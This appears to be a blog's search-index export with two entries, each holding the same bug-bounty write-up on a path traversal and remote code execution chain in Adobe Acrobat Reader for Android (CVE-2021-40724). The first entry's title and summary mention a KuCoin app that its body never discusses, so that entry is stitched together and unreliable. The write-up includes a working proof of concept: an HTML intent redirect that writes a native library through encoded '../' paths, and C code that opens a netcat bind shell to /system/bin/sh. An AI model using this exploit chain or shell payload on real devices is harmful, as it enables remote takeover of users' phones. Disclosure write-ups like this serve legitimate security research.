[{"content":"# Summary While testing KuCoin Android app, i was able to bypass the host b\n# Finding Path traversal vulnerability \u0026lt;activity android:theme=\u0026#34;@style/Theme_Virgo_SplashScreen\u0026#34; android:name=\u0026#34;com.adobe.reader.AdobeReader\u0026#34; android:exported=\u0026#34;true\u0026#34; android:launchMode=\u0026#34;singleTask\u0026#34; android:screenOrientation=\u0026#34;user\u0026#34; android:configChanges=\u0026#34;keyboardHidden|screenLayout|screenSize|smallestScreenSize\u0026#34; android:noHistory=\u0026#34;false\u0026#34; android:resizeableActivity=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.EDIT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;file\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;content\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;http\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34;/\u0026gt; \u0026lt;data android:mimeType=\u0026#34;application/pdf\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; There is this intent-filter in the app which shows it will accept http/https url scheme and mimeType should be application/pdf for this actiivity.\nWhen an intent with data url for example http://localhost/test.pdf is sent to adobe reader app,it downloads the file in /sdcard/Downloads/Adobe Acrobat folder with filename as LastPathSegment(i.e test.pdf) of the sent url.\nActivity com.adobe.reader.AdobeReader receives the intent and starts ARFileURLDownloadActivity activity.\npublic void handleIntent() { Intent intent2 = new Intent(this, ARFileURLDownloadActivity.class); intent2.putExtra(ARFileTransferActivity.FILE_PATH_KEY, intent.getData()); intent2.putExtra(ARFileTransferActivity.FILE_MIME_TYPE, intent.getType()); startActivity(intent2); } This activity ARFileURLDownloadActivitystarts com.adobe.reader.misc.ARFileURLDownloadService service.\npublic void onMAMCreate(Bundle bundle) { super.onMAMCreate(bundle); this.mServiceIntent = new Intent(this, ARFileURLDownloadService.class); Bundle bundle2 = new Bundle(); //...// this.mServiceIntent.putExtras(bundle2); startService(); } In com.adobe.reader.misc.ARFileURLDownloadService.java\npublic int onMAMStartCommand(Intent intent, int i, int i2) { Bundle extras = intent.getExtras(); //..// String string = extras.getString(ARFileTransferActivity.FILE_MIME_TYPE, null); ARURLFileDownloadAsyncTask aRURLFileDownloadAsyncTask = new ARURLFileDownloadAsyncTask(ARApp.getInstance(), (Uri) extras.getParcelable(ARFileTransferActivity.FILE_PATH_KEY), (String) extras.getCharSequence(ARFileTransferActivity.FILE_ID_KEY), true, string); this.mURLFileDownloadAsyncTask = aRURLFileDownloadAsyncTask; aRURLFileDownloadAsyncTask.taskExecute(new Void[0]); return 2; } In com.adobe.reader.misc.ARURLFileDownloadAsyncTask.java\nprivate void downloadFile() throws IOException, SVFileDownloadException { Exception exc; boolean z; Throwable th; boolean z2; Uri fileURI = this.mDownloadModel.getFileURI(); URL url = new URL(fileURI.toString()); try { String downloadFile = new ARFileFromURLDownloader(new ARFileFromURLDownloader.DownloadUrlListener() { ARFileFromURLDownloader.DownloadUrlListener public void onProgressUpdate(int i, int i2) { ARURLFileDownloadAsyncTask.this.broadcastUpdate(0, i, i2); } @Override // com.adobe.reader.misc.ARFileFromURLDownloader.DownloadUrlListener public boolean shouldCancelDownload() { return ARURLFileDownloadAsyncTask.this.isCancelled(); } }).downloadFile(BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData(fileURI.getLastPathSegment(), this.mDownloadModel.getMimeType(), null, fileURI), url); //...// This method BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData takes this.mUri.getLastPathSegment() as argument and which returns the decoded last segment in the path of the url.\nFor example let take this url https://localhost/x/..%2F..%2Ffile.pdf so when this url is passed to getLastPathSegment() method it will take ..%2F..%2Ffile.pdf as last segment of the url and will return ../../file.pdf as output.\nThere was not any sanitization performed in downloadFile variable before passing it into File instance which resulted into path traversal vulnerability.\n# Getting RCE Adobe Acrobat Reader app was using Google play core library to provide additional feature on the go to its users.\nA simple way to know whether an app is using play core library for dynamic code loading is to check for spiltcompat directory in /data/data/:application_id/files/ directory.\nUsing path traversal bug i can write an arbitrary apk in /data/data/com.adobe.reader/files/splitcompat/1921618197/verified-splits/ directory of the app.The classes from the attacker’s apk would automatically be added to the ClassLoader of the app and malicious code will be executed when called from the app. For more detailed explanation read this article\nAdobe reader app also downloads an module name FASOpenCVDF.apk during runtime of app. The plan was to overwrite this file and acheive code execution remotely, but this was not possible. The issue was with this path traversal vulnerability i could not write over existing files\u0026hellip; only create new files.\nI was stuck at this stage for a long time finding a way to gain code execution remotely without installing an additional apk. After analysing other apps using play core library installed on my device, i saw play core library also provide feature of loading native code(.so files) from /data/data/com.adobe.reader/files/splitcompat/:id/native-libraries/ directory.\nFASOpenCVDF.apk module was also loading an native library from /data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a directory. I decided to take a look into FASOpenCVDF.apk source code and there i founded this module is also trying to load three unavailable libraries libADCComponent.so,libColoradoMobile.so and libopencv_info.so and this solved my issue of executing code remotely.\nI created a simple poc native library , renamed it to libopencv_info.so and dropped it in /data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a directory, and from next launch whenever fill and sign feature would be used, the malicious code will be executed.\n# Proof of Concept \u0026lt;html\u0026gt; \u0026lt;title\u0026gt; RCE in Adobe Acrobat Reader for android \u0026lt;/title\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.location.href=\u0026#34;intent://34.127.85.178/x/x/x/x/x/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Ffiles%2Fsplitcompat%2F1921819312%2Fnative-libraries%2FFASOpenCVDF.config.arm64_v8a%2Flibopencv_info.so#Intent;scheme=http;type=application/*;package=com.adobe.reader;component=com.adobe.reader/.AdobeReader;end\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; #include \u0026lt;jni.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) { if (fork() == 0) { system(\u0026#34;toybox nc -p 6666 -L /system/bin/sh -l\u0026#34;); } JNIEnv* env; if (vm-\u0026gt;GetEnv(reinterpret_cast\u0026lt;void**\u0026gt;(\u0026amp;env), JNI_VERSION_1_6) != JNI_OK) { return JNI_ERR; } return JNI_VERSION_1_6; } # Vulnerability Fix ! In com.adobe.libs.buildingblocks.utils.BBIntentUtils.java\nprivate static final String FILE_NAME_RESERVED_CHARACTER = \u0026#34;[*/\\\\|?\u0026lt;\u0026gt;\\\u0026#34;]\u0026#34;; public static String getModifiedFileNameWithExtensionUsingIntentData(String str, String str2, ContentResolver contentResolver, Uri uri) { if (TextUtils.isEmpty(str)) { str = BBConstants.DOWNLOAD_FILE_NAME; } String str3 = null; if (!(contentResolver == null || uri == null)) { str3 = MAMContentResolverManagement.getType(contentResolver, uri); } String str4 = !TextUtils.isEmpty(str3) ? str3 : str2; if (!TextUtils.isEmpty(str4)) { String fileExtensionFromMimeType = BBFileUtils.getFileExtensionFromMimeType(str4); if (!TextUtils.isEmpty(fileExtensionFromMimeType)) { if (str.lastIndexOf(46) == -1) { str = str + \u0026#39;.\u0026#39; + fileExtensionFromMimeType; } else { String mimeTypeForFile = BBFileUtils.getMimeTypeForFile(str); if (TextUtils.isEmpty(mimeTypeForFile) || (!TextUtils.equals(mimeTypeForFile, str3) \u0026amp;\u0026amp; !TextUtils.equals(mimeTypeForFile, str2))) { str = str + \u0026#39;.\u0026#39; + fileExtensionFromMimeType; } } } } return str.replaceAll(FILE_NAME_RESERVED_CHARACTER, \u0026#34;_\u0026#34;); } Have a nice day! and if you got any doubt you can contact me on Twitter.\nTimeline Jul 29th,2021 - Reported the vulnerability to adobe Aug 4th ,2021 - report traiged Oct 13th,2021 - Vulnerability Fixed Dec 4th ,2021 - $10000 bounty awarded from GPSRP ","permalink":"http://localhost:1313/blog/post2/","summary":"\u003ch2 id=\"-summary\"\u003e# Summary\u003c/h2\u003e\n\u003cp\u003eWhile testing KuCoin Android app, i was able to bypass the host b\u003c/p\u003e\n\u003ch2 id=\"-finding-path-traversal-vulnerability\"\u003e# Finding Path traversal vulnerability\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e        \u0026lt;activity android:theme=\u0026#34;@style/Theme_Virgo_SplashScreen\u0026#34; android:name=\u0026#34;com.adobe.reader.AdobeReader\u0026#34; android:exported=\u0026#34;true\u0026#34; android:launchMode=\u0026#34;singleTask\u0026#34; android:screenOrientation=\u0026#34;user\u0026#34; android:configChanges=\u0026#34;keyboardHidden|screenLayout|screenSize|smallestScreenSize\u0026#34; android:noHistory=\u0026#34;false\u0026#34; android:resizeableActivity=\u0026#34;true\u0026#34;\u0026gt;\n            \u0026lt;intent-filter\u0026gt;\n                \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt;\n                \u0026lt;action android:name=\u0026#34;android.intent.action.EDIT\u0026#34;/\u0026gt;\n                \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt;\n                \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;file\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;content\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;http\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;https\u0026#34;/\u0026gt;\n                \u0026lt;data android:mimeType=\u0026#34;application/pdf\u0026#34;/\u0026gt;\n            \u0026lt;/intent-filter\u0026gt;\n\u003c/code\u003e\u003c/pr","title":"Exploiting JavaScript Interface for Unauthorized Access in a 'global' crypto exchange android app"},{"content":"# Summary While testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path traversal vulnerability. Abode reader was also using Google play core library for dynamic code loading. using path traversal bug and dynamic code loading,i was able to acheive remote code execution.\n# Finding Path traversal vulnerability \u0026lt;activity android:theme=\u0026#34;@style/Theme_Virgo_SplashScreen\u0026#34; android:name=\u0026#34;com.adobe.reader.AdobeReader\u0026#34; android:exported=\u0026#34;true\u0026#34; android:launchMode=\u0026#34;singleTask\u0026#34; android:screenOrientation=\u0026#34;user\u0026#34; android:configChanges=\u0026#34;keyboardHidden|screenLayout|screenSize|smallestScreenSize\u0026#34; android:noHistory=\u0026#34;false\u0026#34; android:resizeableActivity=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.EDIT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;file\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;content\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;http\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34;/\u0026gt; \u0026lt;data android:mimeType=\u0026#34;application/pdf\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; There is this intent-filter in the app which shows it will accept http/https url scheme and mimeType should be application/pdf for this actiivity.\nWhen an intent with data url for example http://localhost/test.pdf is sent to adobe reader app,it downloads the file in /sdcard/Downloads/Adobe Acrobat folder with filename as LastPathSegment(i.e test.pdf) of the sent url.\nActivity com.adobe.reader.AdobeReader receives the intent and starts ARFileURLDownloadActivity activity.\npublic void handleIntent() { Intent intent2 = new Intent(this, ARFileURLDownloadActivity.class); intent2.putExtra(ARFileTransferActivity.FILE_PATH_KEY, intent.getData()); intent2.putExtra(ARFileTransferActivity.FILE_MIME_TYPE, intent.getType()); startActivity(intent2); } This activity ARFileURLDownloadActivitystarts com.adobe.reader.misc.ARFileURLDownloadService service.\npublic void onMAMCreate(Bundle bundle) { super.onMAMCreate(bundle); this.mServiceIntent = new Intent(this, ARFileURLDownloadService.class); Bundle bundle2 = new Bundle(); //...// this.mServiceIntent.putExtras(bundle2); startService(); } In com.adobe.reader.misc.ARFileURLDownloadService.java\npublic int onMAMStartCommand(Intent intent, int i, int i2) { Bundle extras = intent.getExtras(); //..// String string = extras.getString(ARFileTransferActivity.FILE_MIME_TYPE, null); ARURLFileDownloadAsyncTask aRURLFileDownloadAsyncTask = new ARURLFileDownloadAsyncTask(ARApp.getInstance(), (Uri) extras.getParcelable(ARFileTransferActivity.FILE_PATH_KEY), (String) extras.getCharSequence(ARFileTransferActivity.FILE_ID_KEY), true, string); this.mURLFileDownloadAsyncTask = aRURLFileDownloadAsyncTask; aRURLFileDownloadAsyncTask.taskExecute(new Void[0]); return 2; } In com.adobe.reader.misc.ARURLFileDownloadAsyncTask.java\nprivate void downloadFile() throws IOException, SVFileDownloadException { Exception exc; boolean z; Throwable th; boolean z2; Uri fileURI = this.mDownloadModel.getFileURI(); URL url = new URL(fileURI.toString()); try { String downloadFile = new ARFileFromURLDownloader(new ARFileFromURLDownloader.DownloadUrlListener() { ARFileFromURLDownloader.DownloadUrlListener public void onProgressUpdate(int i, int i2) { ARURLFileDownloadAsyncTask.this.broadcastUpdate(0, i, i2); } @Override // com.adobe.reader.misc.ARFileFromURLDownloader.DownloadUrlListener public boolean shouldCancelDownload() { return ARURLFileDownloadAsyncTask.this.isCancelled(); } }).downloadFile(BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData(fileURI.getLastPathSegment(), this.mDownloadModel.getMimeType(), null, fileURI), url); //...// This method BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData takes this.mUri.getLastPathSegment() as argument and which returns the decoded last segment in the path of the url.\nFor example let take this url https://localhost/x/..%2F..%2Ffile.pdf so when this url is passed to getLastPathSegment() method it will take ..%2F..%2Ffile.pdf as last segment of the url and will return ../../file.pdf as output.\nThere was not any sanitization performed in downloadFile variable before passing it into File instance which resulted into path traversal vulnerability.\n# Getting RCE Adobe Acrobat Reader app was using Google play core library to provide additional feature on the go to its users.\nA simple way to know whether an app is using play core library for dynamic code loading is to check for spiltcompat directory in /data/data/:application_id/files/ directory.\nUsing path traversal bug i can write an arbitrary apk in /data/data/com.adobe.reader/files/splitcompat/1921618197/verified-splits/ directory of the app.The classes from the attacker’s apk would automatically be added to the ClassLoader of the app and malicious code will be executed when called from the app. For more detailed explanation read this article\nAdobe reader app also downloads an module name FASOpenCVDF.apk during runtime of app. The plan was to overwrite this file and acheive code execution remotely, but this was not possible. The issue was with this path traversal vulnerability i could not write over existing files\u0026hellip; only create new files.\nI was stuck at this stage for a long time finding a way to gain code execution remotely without installing an additional apk. After analysing other apps using play core library installed on my device, i saw play core library also provide feature of loading native code(.so files) from /data/data/com.adobe.reader/files/splitcompat/:id/native-libraries/ directory.\nFASOpenCVDF.apk module was also loading an native library from /data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a directory. I decided to take a look into FASOpenCVDF.apk source code and there i founded this module is also trying to load three unavailable libraries libADCComponent.so,libColoradoMobile.so and libopencv_info.so and this solved my issue of executing code remotely.\nI created a simple poc native library , renamed it to libopencv_info.so and dropped it in /data/data/com.adobe.reader/files/splitcompat/1921819312/native-libraries/FASOpenCVDF.config.arm64_v8a directory, and from next launch whenever fill and sign feature would be used, the malicious code will be executed.\n# Proof of Concept \u0026lt;html\u0026gt; \u0026lt;title\u0026gt; RCE in Adobe Acrobat Reader for android \u0026lt;/title\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.location.href=\u0026#34;intent://34.127.85.178/x/x/x/x/x/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Ffiles%2Fsplitcompat%2F1921819312%2Fnative-libraries%2FFASOpenCVDF.config.arm64_v8a%2Flibopencv_info.so#Intent;scheme=http;type=application/*;package=com.adobe.reader;component=com.adobe.reader/.AdobeReader;end\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; #include \u0026lt;jni.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) { if (fork() == 0) { system(\u0026#34;toybox nc -p 6666 -L /system/bin/sh -l\u0026#34;); } JNIEnv* env; if (vm-\u0026gt;GetEnv(reinterpret_cast\u0026lt;void**\u0026gt;(\u0026amp;env), JNI_VERSION_1_6) != JNI_OK) { return JNI_ERR; } return JNI_VERSION_1_6; } # Vulnerability Fix ! In com.adobe.libs.buildingblocks.utils.BBIntentUtils.java\nprivate static final String FILE_NAME_RESERVED_CHARACTER = \u0026#34;[*/\\\\|?\u0026lt;\u0026gt;\\\u0026#34;]\u0026#34;; public static String getModifiedFileNameWithExtensionUsingIntentData(String str, String str2, ContentResolver contentResolver, Uri uri) { if (TextUtils.isEmpty(str)) { str = BBConstants.DOWNLOAD_FILE_NAME; } String str3 = null; if (!(contentResolver == null || uri == null)) { str3 = MAMContentResolverManagement.getType(contentResolver, uri); } String str4 = !TextUtils.isEmpty(str3) ? str3 : str2; if (!TextUtils.isEmpty(str4)) { String fileExtensionFromMimeType = BBFileUtils.getFileExtensionFromMimeType(str4); if (!TextUtils.isEmpty(fileExtensionFromMimeType)) { if (str.lastIndexOf(46) == -1) { str = str + \u0026#39;.\u0026#39; + fileExtensionFromMimeType; } else { String mimeTypeForFile = BBFileUtils.getMimeTypeForFile(str); if (TextUtils.isEmpty(mimeTypeForFile) || (!TextUtils.equals(mimeTypeForFile, str3) \u0026amp;\u0026amp; !TextUtils.equals(mimeTypeForFile, str2))) { str = str + \u0026#39;.\u0026#39; + fileExtensionFromMimeType; } } } } return str.replaceAll(FILE_NAME_RESERVED_CHARACTER, \u0026#34;_\u0026#34;); } Have a nice day! and if you got any doubt you can contact me on Twitter.\nTimeline Jul 29th,2021 - Reported the vulnerability to adobe Aug 4th ,2021 - report traiged Oct 13th,2021 - Vulnerability Fixed Dec 4th ,2021 - $10000 bounty awarded from GPSRP ","permalink":"http://localhost:1313/blog/post1/","summary":"\u003ch2 id=\"-summary\"\u003e# Summary\u003c/h2\u003e\n\u003cp\u003eWhile testing Adobe Acrobat reader app , the app has a feature which allows user to open pdfs directly from http/https url. This feature was vulnerable to path traversal vulnerability.\nAbode reader was also using Google play core library for dynamic code loading. using path traversal bug and dynamic code loading,i was able to acheive remote code execution.\u003c/p\u003e\n\u003ch2 id=\"-finding-path-traversal-vulnerability\"\u003e# Finding Path traversal vulnerability\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e        \u0026lt;activity android:theme=\u0026#34;@style/Theme_Virgo_SplashScreen\u0026#34; android:name=\u0026#34;com.adobe.reader.AdobeReader\u0026#34; android:exported=\u0026#34;true\u0026#34; android:launchMode=\u0026#34;singleTask\u0026#34; android:screenOrientation=\u0026#34;user\u0026#34; android:configChanges=\u0026#34;keyboardHidden|screenLayout|screenSize|smallestScreenSize\u0026#34; android:noHistory=\u0026#34;false\u0026#34; android:resizeableActivity=\u0026#34;true\u0026#34;\u0026gt;\n            \u0026lt;intent-filter\u0026gt;\n                \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt;\n                \u0026lt;action android:name=\u0026#34;android.intent.action.EDIT\u0026#34;/\u0026gt;\n                \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt;\n                \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;file\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;content\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;http\u0026#34;/\u0026gt;\n                \u0026lt;data android:scheme=\u0026#34;https\u0026#34;/\u0026gt;\n                \u0026lt;data android:mimeType=\u0026#34;application/pdf\u0026#34;/\u0026gt;\n            \u0026lt;/intent-filter\u0026gt;\n\u003c/code\u003e\u003c/pr","title":"RCE in Adobe Acrobat Reader for android(CVE-2021-40724)"}]